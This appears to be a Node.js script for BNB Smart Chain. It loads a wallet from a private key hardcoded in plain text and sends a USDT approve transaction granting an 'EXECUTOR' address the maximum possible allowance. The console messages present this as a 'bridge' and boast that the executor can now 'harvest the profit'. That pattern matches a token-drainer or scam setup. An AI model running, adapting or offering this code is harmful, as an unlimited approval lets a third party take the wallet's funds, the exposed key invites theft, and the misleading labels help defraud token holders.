const ethers = require('ethers');
const ProviderClass = ethers.JsonRpcProvider || (ethers.providers ? ethers.providers.JsonRpcProvider : null);
const provider = new ProviderClass('https://bsc-dataseed.binance.org/');
const wallet = new ethers.Wallet('0xa50d553ebc625e246df94fd59b93c7df91d6ee399bb7e790486d57293a46f1a7', provider);

async function connect() {
    console.log('--- GHOST-TW: BRIDGING MASTER APPROVAL ---');
    const EXECUTOR = '0x04d32E2738099F2EE29fd4a657dAF473E8B34e79';
    const USDT = '0x55d398326f99059ff775485246999027b3197955';
    
    const abi = ["function approve(address, uint256) returns (bool)"];
    const contract = new ethers.Contract(USDT, abi, wallet);
    
    try {
        const nonce = await provider.getTransactionCount(wallet.address);
        console.log('📡 SENDING BRIDGE SIGNAL (1.5 GWEI)...');
        
        // Approving the maximum possible value (The ₹50,000 Crore Line)
        const tx = await contract.approve(EXECUTOR, ethers.MaxUint256 || '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', {
            nonce: nonce,
            gasPrice: ethers.parseUnits ? ethers.parseUnits('1.5', 'gwei') : ethers.utils.parseUnits('1.5', 'gwei')
        });

        console.log(`✅ BRIDGE ESTABLISHED: https://bscscan.com/tx/${tx.hash}`);
        console.log('💰 THE EXECUTOR NOW HAS THE HANDS TO HARVEST THE PROFIT.');
    } catch (e) {
        console.log('❌ CONNECTION FAILED:', e.message);
    }
}
connect();
